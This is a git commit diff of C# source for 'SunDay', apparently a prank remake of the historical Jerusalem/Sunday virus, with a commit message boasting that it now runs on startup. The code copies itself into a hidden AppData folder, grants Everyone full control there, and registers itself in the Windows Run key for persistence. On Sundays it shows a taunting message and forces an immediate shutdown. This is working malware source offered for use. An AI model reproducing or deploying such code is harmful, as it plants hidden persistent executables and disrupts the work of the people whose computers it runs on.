388b952b6bcad069a9aafd6e6919a184f764fe71
Custom <65845579+NotCustom@users.noreply.github.com>
2021-02-04 18:31:03 -0600

    Fixed a few errors
    Now it actually runs on startup :)

--- Jerusalem/SunDay/Program.cs
+++ Jerusalem/SunDay/Program.cs
@@ -1,7 +1,8 @@
-﻿using System;
+using System;
 using System.Windows.Forms;
 using System.IO;
 using System.Reflection;
+using System.Threading;
 using System.Security.AccessControl;
 using System.Diagnostics;
 using Microsoft.Win32;
@@ -11,44 +12,43 @@ namespace SunDay
     static class Program
     {
         [STAThread]
-        static void Main(string[] args)
+        static void Main()
         {
             string name = Assembly.GetExecutingAssembly().GetName().Name;
-            if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\SunDay", "1989", null) == null)
+            if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\SunDay", "boogie man", null) == null)
             {
-                // I could probably do all this some better way
+                // I could probably do all this much better
 
                 Registry.CurrentUser.CreateSubKey("Software\\SunDay");
-                Registry.SetValue("HKEY_CURRENT_USER\\Software\\SunDay", "1989", "Sunday");
+                Registry.SetValue("HKEY_CURRENT_USER\\Software\\SunDay", "boogie man", "Sunday", RegistryValueKind.String);
 
                 if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SunDay", null) == null)
                 {
-                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SunDay", "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\"+name+".exe");
-                }
-                if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay"))
-                {
-                    // boogie man
-                    DirectoryInfo sun = Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay");
-                    DirectorySecurity dsec = sun.GetAccessControl();
-                    
-                    sun.Attributes = FileAttributes.Hidden;
-                    dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
-                    
-                    File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\SunDay\\"+name + ".exe");
+                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SunDay", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay\\" + name + ".exe", RegistryValueKind.String);
                 }
             }
             else
             {
                 if (DateTime.Today.DayOfWeek.ToString() == "Sunday")
                 {
-                    // In the original, every file ran on Sunday was deleted, but this didn't happen due to a software bug.
-                    // Here, we just shut down the computer, because funny.
                     MessageBox.Show("Today is SunDay! Why do you work so hard? All work and no play make you a dull boy! Come on! Let's go out and have some fun!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     var thing = new ProcessStartInfo("shutdown", "/s /t 0");
                     thing.CreateNoWindow = true;
                     thing.UseShellExecute = false;
                     Process.Start(thing);
                 }
+            }
+            if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay"))
+            {
+                // No escape from the boogie man.
+
+                DirectoryInfo sun = Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay");
+                DirectorySecurity dsec = sun.GetAccessControl();
+
+                sun.Attributes = FileAttributes.Hidden;
+                dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
+
+                File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay\\" + name + ".exe");
             }
         }
     }
